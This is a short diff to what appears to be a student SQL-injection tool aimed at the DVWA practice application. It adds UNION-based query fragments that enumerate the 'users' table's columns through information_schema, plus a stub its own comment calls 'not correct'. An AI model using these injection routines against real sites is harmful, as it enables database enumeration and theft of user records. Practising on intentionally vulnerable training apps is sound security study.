@@ -78,10 +78,21 @@ class Union:
 		contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
 		self.exec_union("table_name", contents)
 
+	def get_column_names(self):
+		contents = " FROM information_schema.columns WHERE table_name = 'users'"
+		self.exec_union("column_name", contents)
+
+	def get_all_data(self):
+		# not correct
+		contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
+		self.exec_union("table_name", contents)
+
 	def union(self):
 		self.get_version()
 		self.get_database_name()
 		self.get_table_names()
+		self.get_column_names()
+		self.get_all_data()
 
 class Vaccine:
 	def __init__(self, url, file, method):
